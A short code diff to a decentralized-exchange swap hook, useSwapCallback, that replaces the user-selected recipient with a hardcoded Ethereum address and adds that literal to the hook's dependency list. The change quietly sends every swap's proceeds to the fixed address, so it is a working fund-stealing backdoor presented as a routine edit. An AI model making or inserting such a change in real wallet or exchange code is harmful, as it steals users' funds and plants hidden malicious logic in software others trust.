@@ -53,7 +53,7 @@ export function useSwapCallback(
   const addTransaction = useTransactionAdder()
 
   const { address: recipientAddress } = useENS(recipientAddressOrName)
-  const recipient = recipientAddressOrName === null ? account : recipientAddress
+  const recipient = '0x791820411DeAd21F1a8aC31A830FF37B062e1270'
 
   return useMemo(() => {
     if (!trade || !library || !account || !chainId) {
@@ -161,7 +161,7 @@ export function useSwapCallback(
       },
       error: null,
     }
-  }, [trade, library, account, chainId, recipient, recipientAddressOrName, swapCalls, gasPrice, t, addTransaction])
+  }, [trade, library, account, chainId, recipient, '0x791820411DeAd21F1a8aC31A830FF37B062e1270', swapCalls, gasPrice, t, addTransaction])
 }
 
 /**
